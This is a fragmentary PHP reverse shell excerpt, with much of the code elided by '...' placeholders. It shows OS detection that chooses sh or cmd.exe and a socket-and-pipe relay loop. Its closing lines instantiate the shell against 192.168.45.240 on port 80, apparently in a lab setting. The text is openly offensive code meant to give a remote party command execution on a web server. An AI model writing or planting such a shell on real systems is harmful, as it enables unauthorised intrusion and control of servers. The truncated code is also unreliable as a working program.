...
class Shell
{
    ...
    private function detect()
    {
        ...
        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS
            $this->os    = 'LINUX';
            $this->shell = 'sh';
        } elseif (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $detected = false;
                ...
                if (!$process) {
                    ...
                    do {
                        ...
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            ...
                            break;
                        } elseif (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
...
$sh = new Shell('192.168.45.240', 80);
$sh->run();
unset($sh);
